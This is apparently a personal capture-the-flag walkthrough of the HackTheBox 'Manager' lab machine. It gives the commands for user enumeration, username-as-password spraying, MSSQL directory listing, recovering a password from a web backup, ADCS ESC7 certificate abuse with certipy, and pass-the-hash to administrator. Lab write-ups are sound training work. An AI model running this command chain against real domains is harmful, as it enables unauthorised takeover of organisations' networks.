2024
### NMAP

```
sudo nmap -sC -sV -oN nmap-manager 10.10.11.236
```

When you see this..think of kerberoasting
![[HackTheBox/Windows/attachments/Pasted image 20250521194905.png]]

### Enumerate for Initial Access

#### Kerbrute 
Identify valid users with user list 
```
./kerbrute userenum --dc 10.10.11.236 -d manager.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```

#### NetExec
RID bruteforce valid users 
```
netexec smb 10.10.11.236 -u 'guest' -p '' --rid-bruteforce
```

![[HackTheBox/Windows/attachments/Pasted image 20250521204615.png]]

![[HackTheBox/Windows/attachments/Pasted image 20250521204648.png]]
This is basically performing lookupsids over and over.

Extracting all valid usernames from this netexec output 

```
grep User_output.txt | awk '{$6}' 
```

![[HackTheBox/Windows/attachments/Pasted image 20250521205142.png]]

```
grep User_output.txt | awk '{$6}' | awk -F\\ '{print $2}'
```
![[HackTheBox/Windows/attachments/Pasted image 20250521205302.png]]

Then sort and grep for everything that ends in $
```
grep User_output.txt | awk '{$6}' | awk -F\\ '{print $2}' | sort -u| grep -v '\$$'
```

![[HackTheBox/Windows/attachments/Pasted image 20250521205418.png]]
Save this output to users.txt

Change all uppercase to lowercase
```
cat users.txt | tr '[:upper:]' '[:lower:]'
```
![[HackTheBox/Windows/attachments/Pasted image 20250521210030.png]]
### Initial Access

Use the valid username list to bruteforce users with the password of their username. Found several matches. 


#### NetExec

Bruteforce users with the password of their username (ex: admin:admin)
```
netexec smb 10.10.11.236 -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

![[HackTheBox/Windows/attachments/Pasted image 20250521210125.png]]

Enumerate smb shares with valid credentials
```
netexec smb 10.10.11.236 -u operator -p operator --shares
```

![[HackTheBox/Windows/attachments/Pasted image 20250521210656.png]]
- No shares look interesting

Test login against MSSQL
```
netexec mssql 10.10.11.236 -u operator -p operator
```

![[HackTheBox/Windows/attachments/Pasted image 20250521211013.png]]

Login to MSSQL Server using impacket's MSSQLClient 
```
mssqlclient.py manager/operator:operator@manager.htb -windows-auth
```

![[HackTheBox/Windows/attachments/Pasted image 20250521211322.png]]
### Enumerate for Priv Esc 

Only seeing standard databases
```
SELECT name FROM master..sysdatabases;
```
![[HackTheBox/Windows/attachments/Pasted image 20250521211705.png]]

Read files off the web server using xp_dirtree
```
xp_dirtree C:\
```
![[HackTheBox/Windows/attachments/Pasted image 20250521211814.png]]

Discover a website backup 
```
xp_dirtree C:\inetpub\wwwroot
```
![[HackTheBox/Windows/attachments/Pasted image 20250521211913.png]]

Download this backup by appending it to the website URL 👀
![[HackTheBox/Windows/attachments/Pasted image 20250521212000.png]]

Unzip this file. 

Check out .old-conf.xml and discover a user password
![[HackTheBox/Windows/attachments/Pasted image 20250521212143.png]]

Test these creds using netexec with smb
```
netexec smb 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
```
![[HackTheBox/Windows/attachments/Pasted image 20250521212353.png]]
- creds are valid

Test these creds using netexec with winrm
```
netexec winrm 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
```
![[HackTheBox/Windows/attachments/Pasted image 20250521212516.png]]
- these will work

Use certipy to discover server is exploitable to ADCS ESC7
```
certipy find -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -stdout -vulnerable
```

![[HackTheBox/Windows/attachments/Pasted image 20250521213417.png]]
![[HackTheBox/Windows/attachments/Pasted image 20250521213437.png]]

### Priv Esc

[Reference](https://seriotonctf.github.io/2024/06/26/ADCS-Attacks-with-Certipy/index.html)

Add officer raven to be able to manage ca's

```
certipy ca -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -add-officer raven
```

![[HackTheBox/Windows/attachments/Pasted image 20250521214109.png]]

Enable sub-ca template
```
certipy ca -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -enable-template subca
```

Set upn to administrator and save the private key 

```
certipy req -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb
```

![[HackTheBox/Windows/attachments/Pasted image 20250521214630.png]]

Now we can issue a certificate because we are an officer of the ca

```
certipy-ad ca -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -issue-request 13
```

![[HackTheBox/Windows/attachments/Pasted image 20250521214831.png]]

Now retrieve the certificate administrator.pfx
```
certipy-ad req -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -retrieve 13
```

![[HackTheBox/Windows/attachments/Pasted image 20250521214949.png]]

Get a TGT from the domain using pfx and then get the NT hash for administrator

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236
```

![[HackTheBox/Windows/attachments/Pasted image 20250521215101.png]]

Ensure our local clock is in sync with DCs

```
sudo ntpdate 10.10.11.236
```

#### PSExec 

```
psexec.py -hashes <NT HASH>:<NT HASH> administrator@10.10.11.236
```

![[HackTheBox/Windows/attachments/Pasted image 20250521215459.png]]
⭐got root⭐